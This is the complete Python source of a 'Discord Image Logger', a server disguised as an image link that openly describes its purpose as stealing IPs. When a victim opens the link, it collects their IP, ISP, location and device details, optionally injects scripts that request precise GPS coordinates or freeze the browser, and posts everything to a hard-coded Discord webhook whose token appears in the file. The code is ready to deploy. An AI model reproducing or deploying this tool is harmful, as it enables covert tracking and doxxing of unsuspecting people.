# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1476847804705017916/z4q_XyzHFVvluAfG3pgBCUJaxtTdr4tswooL1Yz49Dvwf-_MQZWTc7v13Chzevm0sK-Q",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

